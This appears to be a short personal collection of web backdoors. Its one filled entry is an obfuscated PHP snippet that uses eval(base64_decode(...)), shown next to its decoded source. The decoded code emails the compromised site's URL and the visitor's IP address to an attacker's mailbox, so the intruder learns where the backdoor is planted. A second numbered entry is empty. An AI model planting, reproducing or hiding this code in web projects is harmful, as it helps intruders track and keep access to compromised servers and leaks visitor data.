*Backdoors*
---
```
1 - 

<?php
eval(base64_decode('JHR1anVhbm1haWwgPSAneW91cm1haWxAeWFuZGV4LmNvbSc7CiR4X3BhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokcGVzYW5fYWxlcnQgPSAiZml4ICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7Cm1haWwoJHR1anVhbm1haWwsICJDb250YWN0IE1lIiwgJHBlc2FuX2FsZXJ0LCAiWyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iKTs='));
?>

after decode : 
$tujuanmail = 'yourmail@yandex.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Contact Me", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");


2- 

```
